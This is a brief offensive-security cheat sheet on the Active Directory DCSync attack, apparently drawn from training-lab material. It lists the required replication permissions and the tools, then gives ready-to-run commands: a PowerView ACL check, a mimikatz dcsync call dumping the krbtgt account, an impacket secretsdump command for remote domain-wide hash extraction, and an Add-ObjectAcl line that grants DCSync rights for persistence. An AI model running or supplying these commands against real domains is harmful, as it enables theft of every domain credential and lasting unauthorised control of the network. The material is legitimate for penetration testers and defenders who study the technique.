# Overview
The DCSync attack simulates the behaviour of a Domain Controller and asks other Domain Controllers to replicate information using the Directory Replication Service Remote Protocol (MS-DRSR). Because MS-DRSR is a valid and necessary function of Active Directory, it cannot be turned off or disabled.

## Prerequisites
- Having the following permission:  **Replicate Directory Changes**, **Replicate Directory Changes All**

## Tools
- [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)
- [mimikatz](https://github.com/gentilkiwi/mimikatz)

# Enumeration
```powershell
# PoverView - Check Permission
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```

# Exploit
## Local
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

## Remote
```bash
secretsdump.py -just-dc <USER>:<PASSWORD>@<IP> -outputfile <OUTPUT.txt>
```


# Persistence
If you are a *domain admin*, you can grant DCSync rights to anyone using [*PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
```powershell
Add-ObjectAcl -TargetDistinguishedName "dc=company,dc=corp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```

# References
- [https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/dcsync.html](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/dcsync.html)
- [https://www.semperis.com/blog/dcsync-attack/](https://www.semperis.com/blog/dcsync-attack/)
